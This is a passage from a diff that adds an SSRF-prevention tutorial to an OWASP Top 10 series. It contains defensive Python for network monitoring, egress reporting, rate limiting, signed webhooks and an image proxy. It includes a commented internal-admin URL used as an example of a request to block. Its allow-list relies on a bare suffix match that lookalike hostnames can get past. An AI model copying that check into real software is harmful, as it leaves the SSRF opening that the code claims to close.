+            for line in result.stdout.split('\n'):
+                if process_name in line:
+                    parts = line.split()
+                    if len(parts) >= 4:
+                        connection = {
+                            'protocol': parts[0],
+                            'local_address': parts[3],
+                            'foreign_address': parts[4] if len(parts) > 4 else '',
+                            'state': parts[5] if len(parts) > 5 else '',
+                            'suspicious': self._is_suspicious_connection(parts[4] if len(parts) > 4 else '')
+                        }
+                        connections.append(connection)
+            
+            return connections
+        
+        except Exception as e:
+            print(f"Error monitoring connections: {e}")
+            return []
+    
+    def _is_suspicious_connection(self, foreign_address: str) -> bool:
+        """Check if connection is suspicious"""
+        
+        if not foreign_address or foreign_address == '*':
+            return False
+        
+        try:
+            # Extract IP from address:port format
+            ip_str = foreign_address.split(':')[0]
+            ip = ipaddress.ip_address(ip_str)
+            
+            # Check against private ranges
+            private_ranges = [
+                ipaddress.ip_network('127.0.0.0/8'),
+                ipaddress.ip_network('10.0.0.0/8'),
+                ipaddress.ip_network('172.16.0.0/12'),
+                ipaddress.ip_network('192.168.0.0/16'),
+                ipaddress.ip_network('169.254.0.0/16'),
+            ]
+            
+            for private_range in private_ranges:
+                if ip in private_range:
+                    return True
+            
+            return False
+        
+        except Exception:
+            return False
+    
+    def generate_security_report(self) -> str:
+        """Generate network security report"""
+        
+        report = f"""
+NETWORK-LEVEL SSRF PROTECTION REPORT
+===================================
+
+FIREWALL RULES:
+--------------
+{chr(10).join(self.setup_egress_filtering())}
+
+NETWORK NAMESPACE SETUP:
+-----------------------
+{chr(10).join(self.setup_network_namespace())}
+
+PROXY CONFIGURATIONS:
+--------------------
+Available proxy configurations for additional protection.
+
+MONITORING:
+----------
+Network connection monitoring active for suspicious outbound connections.
+
+RECOMMENDATIONS:
+---------------
+1. Implement egress filtering at firewall level
+2. Use network namespace isolation for web applications
+3. Deploy transparent proxy for outbound request filtering
+4. Monitor and alert on suspicious network connections
+5. Regular security audits of network configurations
+"""
+        
+        return report
+
+# Usage example
+network_protection = NetworkLevelSSRFProtection()
+
+# Generate firewall rules
+firewall_rules = network_protection.setup_egress_filtering()
+print("Firewall Rules for SSRF Protection:")
+print("=" * 40)
+for rule in firewall_rules:
+    print(rule)
+
+print("\n" + "=" * 40)
+print("Network Security Report:")
+print(network_protection.generate_security_report())
+```
+
+### 3. Application-Level Protection
+
+```python
+import time
+import hashlib
+from typing import Dict, List, Optional, Callable
+from functools import wraps
+import logging
+
+class ApplicationLevelSSRFProtection:
+    """Application-level SSRF protection mechanisms"""
+    
+    def __init__(self):
+        self.request_cache = {}
+        self.rate_limits = {}
+        self.allowed_callbacks = set()
+        self.logger = logging.getLogger(__name__)
+        
+        # Configure logging
+        logging.basicConfig(
+            level=logging.INFO,
+            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+        )
+    
+    def ssrf_protected_fetch(self, 
+                           validation_func: Callable[[str], tuple] = None,
+                           rate_limit: int = 10,
+                           cache_ttl: int = 300) -> Callable:
+        """Decorator for SSRF-protected URL fetching"""
+        
+        def decorator(func):
+            @wraps(func)
+            def wrapper(url: str, *args, **kwargs):
+                
+                # Rate limiting
+                if not self._check_rate_limit(url, rate_limit):
+                    raise Exception("Rate limit exceeded for URL")
+                
+                # URL validation
+                if validation_func:
+                    is_valid, message = validation_func(url)
+                    if not is_valid:
+                        self.logger.warning(f"SSRF attempt blocked: {url} - {message}")
+                        raise Exception(f"URL validation failed: {message}")
+                
+                # Check cache
+                cache_key = self._generate_cache_key(url)
+                if cache_key in self.request_cache:
+                    cache_entry = self.request_cache[cache_key]
+                    if time.time() - cache_entry['timestamp'] < cache_ttl:
+                        self.logger.info(f"Serving cached response for: {url}")
+                        return cache_entry['response']
+                
+                # Execute original function
+                try:
+                    response = func(url, *args, **kwargs)
+                    
+                    # Cache successful response
+                    self.request_cache[cache_key] = {
+                        'response': response,
+                        'timestamp': time.time()
+                    }
+                    
+                    self.logger.info(f"Successful request to: {url}")
+                    return response
+                
+                except Exception as e:
+                    self.logger.error(f"Failed request to: {url} - {str(e)}")
+                    raise
+            
+            return wrapper
+        return decorator
+    
+    def _check_rate_limit(self, url: str, limit: int) -> bool:
+        """Check rate limiting for URL"""
+        
+        current_time = time.time()
+        window_size = 60  # 1 minute window
+        
+        if url not in self.rate_limits:
+            self.rate_limits[url] = []
+        
+        # Clean old entries
+        self.rate_limits[url] = [
+            timestamp for timestamp in self.rate_limits[url]
+            if current_time - timestamp < window_size
+        ]
+        
+        # Check limit
+        if len(self.rate_limits[url]) >= limit:
+            return False
+        
+        # Add current request
+        self.rate_limits[url].append(current_time)
+        return True
+    
+    def _generate_cache_key(self, url: str) -> str:
+        """Generate cache key for URL"""
+        return hashlib.sha256(url.encode()).hexdigest()
+    
+    def create_secure_webhook_handler(self, 
+                                    allowed_domains: List[str],
+                                    secret_key: str) -> Callable:
+        """Create secure webhook handler with SSRF protection"""
+        
+        def webhook_handler(callback_url: str, payload: Dict, signature: str = None):
+            
+            # Validate signature if provided
+            if signature:
+                expected_signature = self._generate_webhook_signature(payload, secret_key)
+                if not self._verify_signature(signature, expected_signature):
+                    raise Exception("Invalid webhook signature")
+            
+            # Validate callback URL
+            from urllib.parse import urlparse
+            parsed = urlparse(callback_url)
+            
+            if not any(parsed.hostname.endswith(domain) for domain in allowed_domains):
+                raise Exception(f"Callback URL domain not allowed: {parsed.hostname}")
+            
+            # Additional SSRF validation
+            ssrf_protection = SSRFProtection()
+            is_valid, message = ssrf_protection.validate_url(callback_url)
+            
+            if not is_valid:
+                raise Exception(f"SSRF protection blocked callback: {message}")
+            
+            # Make callback request
+            import requests
+            try:
+                response = requests.post(
+                    callback_url,
+                    json=payload,
+                    timeout=30,
+                    headers={
+                        'Content-Type': 'application/json',
+                        'User-Agent': 'SecureWebhook/1.0'
+                    }
+                )
+                
+                self.logger.info(f"Webhook delivered successfully to: {callback_url}")
+                return response
+            
+            except Exception as e:
+                self.logger.error(f"Webhook delivery failed: {callback_url} - {str(e)}")
+                raise
+        
+        return webhook_handler
+    
+    def _generate_webhook_signature(self, payload: Dict, secret: str) -> str:
+        """Generate HMAC signature for webhook"""
+        import hmac
+        import json
+        
+        payload_str = json.dumps(payload, sort_keys=True)
+        signature = hmac.new(
+            secret.encode(),
+            payload_str.encode(),
+            hashlib.sha256
+        ).hexdigest()
+        
+        return f"sha256={signature}"
+    
+    def _verify_signature(self, received_signature: str, expected_signature: str) -> bool:
+        """Verify webhook signature"""
+        import hmac
+        return hmac.compare_digest(received_signature, expected_signature)
+    
+    def create_secure_image_proxy(self, 
+                                 allowed_domains: List[str],
+                                 max_file_size: int = 5 * 1024 * 1024) -> Callable:
+        """Create secure image proxy with SSRF protection"""
+        
+        def image_proxy(image_url: str) -> bytes:
+            
+            # Validate URL
+            from urllib.parse import urlparse
+            parsed = urlparse(image_url)
+            
+            # Check domain whitelist
+            if not any(parsed.hostname.endswith(domain) for domain in allowed_domains):
+                raise Exception(f"Image domain not allowed: {parsed.hostname}")
+            
+            # SSRF protection
+            ssrf_protection = SSRFProtection()
+            is_valid, message = ssrf_protection.validate_url(image_url)
+            
+            if not is_valid:
+                raise Exception(f"SSRF protection blocked image URL: {message}")
+            
+            # Fetch image with security measures
+            import requests
+            from PIL import Image
+            import io
+            
+            try:
+                response = requests.get(
+                    image_url,
+                    timeout=30,
+                    stream=True,
+                    headers={
+                        'User-Agent': 'SecureImageProxy/1.0',
+                        'Accept': 'image/*'
+                    }
+                )
+                
+                # Check content type
+                content_type = response.headers.get('content-type', '')
+                if not content_type.startswith('image/'):
+                    raise Exception(f"Invalid content type: {content_type}")
+                
+                # Check file size
+                content_length = response.headers.get('content-length')
+                if content_length and int(content_length) > max_file_size:
+                    raise Exception(f"Image too large: {content_length} bytes")
+                
+                # Read and validate image
+                image_data = b''
+                for chunk in response.iter_content(chunk_size=8192):
+                    image_data += chunk
+                    if len(image_data) > max_file_size:
+                        raise Exception("Image too large")
+                
+                # Validate image format
+                try:
+                    image = Image.open(io.BytesIO(image_data))
+                    image.verify()  # Verify it's a valid image
+                except Exception:
+                    raise Exception("Invalid image format")
+                
+                self.logger.info(f"Image proxy successful: {image_url}")
+                return image_data
+            
+            except Exception as e:
+                self.logger.error(f"Image proxy failed: {image_url} - {str(e)}")
+                raise
+        
+        return image_proxy
+
+# Usage examples
+app_protection = ApplicationLevelSSRFProtection()
+ssrf_protection = SSRFProtection()
+
+# Example 1: Protected URL fetching
+@app_protection.ssrf_protected_fetch(
+    validation_func=ssrf_protection.validate_url,
+    rate_limit=5,
+    cache_ttl=300
+)
+def fetch_external_data(url: str) -> str:
+    """Fetch external data with SSRF protection"""
+    import requests
+    
+    response = requests.get(url, timeout=10)
+    return response.text
+
+# Example 2: Secure webhook handler
+webhook_handler = app_protection.create_secure_webhook_handler(
+    allowed_domains=['api.trusted-partner.com', 'webhooks.example.com'],
+    secret_key='your-secret-key'
+)
+
+# Example 3: Secure image proxy
+image_proxy = app_protection.create_secure_image_proxy(
+    allowed_domains=['images.example.com', 'cdn.trusted-site.com'],
+    max_file_size=5 * 1024 * 1024  # 5MB
+)
+
+# Testing the protection
+try:
+    # This should work (if domain is whitelisted)
+    # data = fetch_external_data('https://api.example.com/data')
+    
+    # This should be blocked
+    # data = fetch_external_data('http://localhost:8080/admin')
+    
+    print("SSRF protection working correctly")
+    
+except Exception as e:
+    print(f"Protection activated: {e}")
+```
+
+## Conclusion
+
+Server-Side Request Forgery (SSRF) is a critical vulnerability that can lead to unauthorized access to internal services, data exfiltration, and cloud infrastructure compromise. Effective SSRF prevention requires a multi-layered approach:
+
+### Key Prevention Strategies:
+
+1. **Input Validation**: Strict URL validation with allow-lists
+2. **Network Segmentation**: Isolate applications from internal services
+3. **Egress Filtering**: Control outbound network connections
+4. **Application Controls**: Rate limiting, caching, and monitoring
+5. **Infrastructure Security**: Cloud metadata protection and proper IAM
+
+### Defense in Depth:
+
+- **Application Layer**: Input validation and secure coding practices
+- **Network Layer**: Firewalls and network segmentation
+- **Infrastructure Layer**: Cloud security and monitoring
+- **Monitoring Layer**: Detection and response capabilities
+
+By implementing comprehensive SSRF protections, organizations can significantly reduce their attack surface and protect critical internal resources from unauthorized access.
+
+---
+
+*This completes the OWASP Top 10 2021 series. Start with: [A01 - Broken Access Control](../a01-broken-access-control)*
